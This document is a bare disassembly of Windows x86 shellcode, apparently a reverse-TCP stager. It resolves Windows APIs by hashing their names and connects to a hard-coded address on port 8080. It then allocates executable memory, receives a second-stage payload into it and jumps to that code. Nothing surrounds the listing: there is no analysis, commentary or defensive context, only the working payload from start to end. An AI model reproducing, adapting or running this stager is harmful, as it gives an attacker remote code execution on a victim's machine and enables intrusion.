cld    
call   0x88
pusha  
mov    ebp,esp
xor    eax,eax
mov    edx,DWORD PTR fs:[eax+0x30]
mov    edx,DWORD PTR [edx+0xc]
mov    edx,DWORD PTR [edx+0x14]
mov    esi,DWORD PTR [edx+0x28]
movzx  ecx,WORD PTR [edx+0x26]
xor    edi,edi
lods   al,BYTE PTR ds:[esi]
cmp    al,0x61
jl     0x25
sub    al,0x20
ror    edi,0xd
add    edi,eax
loop   0x1e
push   edx
push   edi
mov    edx,DWORD PTR [edx+0x10]
mov    ecx,DWORD PTR [edx+0x3c]
mov    ecx,DWORD PTR [ecx+edx*1+0x78]
jecxz  0x82
add    ecx,edx
push   ecx
mov    ebx,DWORD PTR [ecx+0x20]
add    ebx,edx
mov    ecx,DWORD PTR [ecx+0x18]
jecxz  0x81
dec    ecx
mov    esi,DWORD PTR [ebx+ecx*4]
add    esi,edx
xor    edi,edi
lods   al,BYTE PTR ds:[esi]
ror    edi,0xd
add    edi,eax
cmp    al,ah
jne    0x4f
add    edi,DWORD PTR [ebp-0x8]
cmp    edi,DWORD PTR [ebp+0x24]
jne    0x45
pop    eax
mov    ebx,DWORD PTR [eax+0x24]
add    ebx,edx
mov    cx,WORD PTR [ebx+ecx*2]
mov    ebx,DWORD PTR [eax+0x1c]
add    ebx,edx
mov    eax,DWORD PTR [ebx+ecx*4]
add    eax,edx
mov    DWORD PTR [esp+0x24],eax
pop    ebx
pop    ebx
popa   
pop    ecx
pop    edx
push   ecx
jmp    eax
pop    edi
pop    edi
pop    edx
mov    edx,DWORD PTR [edx]
jmp    0x15
pop    ebp
push   0x3233
push   0x5f327377
push   esp
push   0x726774c
call   ebp
mov    eax,0x190
sub    esp,eax
push   esp
push   eax
push   0x6b8029
call   ebp
push   0x5
push   0x83cca8c0
push   0x901f0002
mov    esi,esp
push   eax
push   eax
push   eax
push   eax
inc    eax
push   eax
inc    eax
push   eax
push   0xe0df0fea
call   ebp
xchg   edi,eax
push   0x10
push   esi
push   edi
push   0x6174a599
call   ebp
test   eax,eax
je     0xe2
dec    DWORD PTR [esi+0x8]
jne    0xc9
call   0x143
push   0x0
push   0x4
push   esi
push   edi
push   0x5fc8d902
call   ebp
cmp    eax,0x0
jle    0x12a
mov    esi,DWORD PTR [esi]
push   0x40
push   0x1000
push   esi
push   0x0
push   0xe553a458
call   ebp
xchg   ebx,eax
push   ebx
push   0x0
push   esi
push   ebx
push   edi
push   0x5fc8d902
call   ebp
cmp    eax,0x0
jge    0x13c
pop    eax
push   0x4000
push   0x0
push   eax
push   0x300f2f0b
call   ebp
push   edi
push   0x614d6e75
call   ebp
pop    esi
pop    esi
dec    DWORD PTR [esp]
jmp    0xad
add    ebx,eax
sub    esi,eax
jne    0x109
ret    
mov    ebx,0x56a2b5f0
push   0x0
push   ebx
call   ebp